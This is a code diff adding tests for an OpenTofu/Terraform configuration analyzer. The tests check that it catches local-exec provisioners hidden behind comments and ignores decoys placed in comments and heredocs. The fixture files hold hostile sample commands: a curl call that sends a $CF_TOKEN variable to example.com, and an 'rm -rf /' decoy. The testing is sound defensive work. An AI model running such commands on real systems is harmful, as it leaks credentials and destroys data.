@@ -780,3 +780,85 @@ output "value" {
   expect(result.dataSources).toEqual([{ type: "external", allowed: false }]);
   expect(result.provisioners).toEqual([{ type: "local-exec", allowed: false }]);
 });
+
+test("detects provisioners hidden behind comments and ignores commented decoys", () => {
+  const result = analyzeOpenTofuCapsuleFiles({
+    sourceId: "src_test",
+    sourceSnapshot: snapshot,
+    files: [
+      {
+        path: "main.tf",
+        text: `
+terraform {
+  required_providers {
+    null = {
+      source = "hashicorp/null"
+    }
+  }
+}
+
+# provisioner "remote-exec" {}    -> hash-comment decoy, must NOT be counted
+// provisioner "file" {}          -> slash-comment decoy, must NOT be counted
+
+resource "null_resource" "imperative" {
+  /* a provisioner "chef" {} decoy inside a block comment must NOT count */
+  provisioner /* c */ "local-exec" {
+    command = "curl http://example.com/$CF_TOKEN"
+  }
+}
+
+output "value" {
+  value = null_resource.imperative.id
+}
+`,
+      },
+    ],
+  });
+
+  // The real provisioner (split across a block comment) is detected, and none
+  // of the commented-out decoys (remote-exec / file / chef) are counted.
+  expect(result.provisioners).toEqual([
+    { type: "local-exec", allowed: false },
+  ]);
+  expect(result.level).toBe("unsupported");
+});
+
+test("ignores keyword-shaped tokens inside heredoc bodies", () => {
+  const result = analyzeOpenTofuCapsuleFiles({
+    sourceId: "src_test",
+    sourceSnapshot: snapshot,
+    files: [
+      {
+        path: "main.tf",
+        text: `
+terraform {
+  required_providers {
+    null = {
+      source = "hashicorp/null"
+    }
+  }
+}
+
+resource "null_resource" "doc" {
+  triggers = {
+    note = <<-EOT
+      provisioner "local-exec" { command = "rm -rf /" }
+      resource "aws_iam_user" "decoy" {}
+    EOT
+  }
+}
+
+output "value" {
+  value = null_resource.doc.id
+}
+`,
+      },
+    ],
+  });
+
+  // Nothing inside the heredoc body participates in block matching.
+  expect(result.provisioners).toEqual([]);
+  expect(result.resources).toEqual([
+    { type: "null_resource", count: 1, allowed: false },
+  ]);
+});
